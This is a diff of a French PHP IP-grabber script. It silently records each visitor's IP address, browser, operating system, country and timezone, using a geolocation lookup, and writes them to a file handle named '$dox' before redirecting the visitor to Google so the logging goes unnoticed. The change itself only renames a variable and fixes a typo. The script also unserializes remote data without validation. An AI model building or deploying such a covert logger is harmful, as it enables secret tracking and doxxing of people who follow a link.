@@ -12,12 +12,12 @@ elseif(preg_match('/Unix/i',$user_agent)) $os = 'Unix';
 elseif(preg_match('/Windows/i',$user_agent)) $os = 'Windows';
 else $os = 'Système inconnu...';
 
-if(preg_match('/Firefox/i',$user_agent)) $br = 'Firefox'; 
-elseif(preg_match('/Mac/i',$user_agent)) $br = 'Mac';
-elseif(preg_match('/Chrome/i',$user_agent)) $br = 'Chrome'; 
-elseif(preg_match('/Opera/i',$user_agent)) $br = 'Opera'; 
-elseif(preg_match('/MSIE/i',$user_agent)) $br = 'Internet Explorer'; 
-else $bs = 'Navigateur inconnu...';
+if(preg_match('/Firefox/i',$user_agent)) $navigateur = 'Firefox'; 
+elseif(preg_match('/Mac/i',$user_agent)) $navigateur = 'Mac';
+elseif(preg_match('/Chrome/i',$user_agent)) $navigateur = 'Chrome'; 
+elseif(preg_match('/Opera/i',$user_agent)) $navigateur = 'Opera'; 
+elseif(preg_match('/MSIE/i',$user_agent)) $navigateur = 'Internet Explorer'; 
+else $navigateur = 'Navigateur inconnu...';
 
 $query = @unserialize(file_get_contents('http://ip-api.com/php/'. $ip)); 
 
@@ -34,7 +34,7 @@ if($query && $query['status'] == 'success')
         
     $data = "
     IP : " . $ip . "\r
-    Navigateur : " . $br . "\r
+    Navigateur : " . $navigateur . "\r
     Système : " . $os . "\r
     Pays : " . $pays . "\r
     Timezone : " . $timezone . "\r
@@ -50,6 +50,6 @@ if($query && $query['status'] == 'success')
     fputs($dox, $data);
     fclose($dox);
 	
-	header('Location: https://www.google.fr/');
+    header('Location: https://www.google.fr/');
 }
 ?>
